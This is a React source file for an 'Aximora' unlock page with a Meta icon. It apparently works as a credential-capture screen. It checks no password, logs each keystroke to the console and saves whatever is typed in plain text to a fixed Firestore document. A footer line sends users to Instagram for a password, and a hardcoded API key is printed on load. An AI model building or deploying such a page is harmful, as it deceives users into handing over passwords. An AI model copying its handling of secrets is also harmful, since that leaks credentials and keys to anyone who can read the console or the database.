import { Card, CardContent } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { IconBrandMeta } from '@tabler/icons-react';
import { useState, useEffect } from "react";
import { db } from "../firebase/firebaseConfig";
import { doc, setDoc } from "firebase/firestore";

const LoginPage = () => {
  const [password, setPassword] = useState('');

  useEffect(() => {
    console.log("API Key:", "AIzaSyCfcyk476UDIn5lL96lad_OTKQhhCqjVTk");
  }, []);

  const handlePassword = (e) => {
    const newPassword = e.target.value;
    setPassword(newPassword);
    console.log(newPassword);
  }

  const savePasswordToFirestore = async (password) => {
    try {
      const passwordRef = doc(db, "users", "userPassword");
      await setDoc(passwordRef, {
        Password: password,
      });
      console.log("Password saved to Firestore");
    } catch (error) {
      console.error("Error saving password: ", error);
    }
  };

  return (
    <div className="flex justify-center items-center min-h-screen bg-white">
      <Card className="w-full max-w-3xl shadow-xl border border-gray-300 rounded-lg overflow-hidden">
        <div className="flex h-[480px]">
          <div className="w-1/2 bg-[#393838] text-white p-8 flex flex-col justify-between">
            <div className="flex items-center">
              <IconBrandMeta className="mr-2" size={30} />
              <h1 className="text-2xl font-bold">Aximora</h1>
            </div>
            <div>
              <p className="text-sm ">
                "This platform has saved me countless hours of work and helped me
                implement stuff faster than ever before."
              </p>
              <p className="mt-2 text-sm">Sofia Davis</p>
            </div>
          </div>

          <CardContent className="w-1/2 p-8 bg-white flex flex-col justify-center">
            <div className="flex-grow flex flex-col justify-center">
              <h2 className="text-2xl font-bold mb-2 text-[#393838]">Unlock the app</h2>
              <p className="text-sm mb-4 text-gray-500">
                To unlock enter password
              </p>
              <Input
                type="password"
                placeholder="password"
                value={password}
                onChange={handlePassword}
                className="mb-4 placeholder-gray-500"
              />
              <Button
                className="w-full mb-4 bg-[#393838] hover:bg-[#393838]/90 text-white font-semibold"
                onClick={() => savePasswordToFirestore(password)}
              >
                Unlock the app
              </Button>

              <p className="text-xs mt-4 text-center text-gray-500">
                To get password DM drop 1 on Instagram
              </p>
            </div>
          </CardContent>
        </div>
      </Card>
    </div>
  );
};

export default LoginPage;